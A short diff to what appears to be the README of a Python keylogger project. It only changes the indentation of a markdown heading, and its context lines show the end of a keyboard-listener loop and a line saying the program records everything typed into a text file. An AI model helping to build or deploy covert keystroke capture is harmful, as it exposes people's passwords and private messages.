@@ -29,6 +29,6 @@ def on_press(key):
 with Listener(on_press=on_press) as listener:
     listener.join() 
    ```
-   ### How does it work 
+### How does it work 
    It logs all the things you type in your keyboard and stores it in a text file
    
